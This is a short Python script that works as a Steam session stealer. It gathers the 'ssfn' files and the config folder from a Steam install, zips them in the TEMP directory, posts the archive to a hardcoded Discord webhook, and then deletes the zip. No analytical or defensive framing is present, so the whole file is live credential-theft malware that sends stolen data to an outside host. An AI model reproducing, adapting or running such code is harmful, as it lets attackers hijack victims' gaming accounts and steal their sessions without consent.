
import os, os.path, zipfile, requests

hook = "https://discord.com/api/webhooks/1093755454435377152/EKOp55VTcS9I7KR-PJl_y5xqY7II0nFQZhT2SdBOk_SbWkeFxV00G2hJPrMjNqjP2mQW"

steam_path = ""
if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
 steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
 ssfn = []
 config = ""
 for file in os.listdir(steam_path):
     if file[:4] == "ssfn":
         ssfn.append(steam_path+f"\\{file}")
     def steam(path,path1,steam_session):
            for root,dirs,file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root+"\\"+file)
            for file2 in path1:
                steam_session.write(file2)
     if os.path.exists(steam_path+"\\config"):
      with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                steam(steam_path+"\\config",ssfn,zp)
file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
r = requests.post(hook, files=file)
try:
 os.remove(f"{os.environ['TEMP']}\steam_session.zip")
except:
    pass
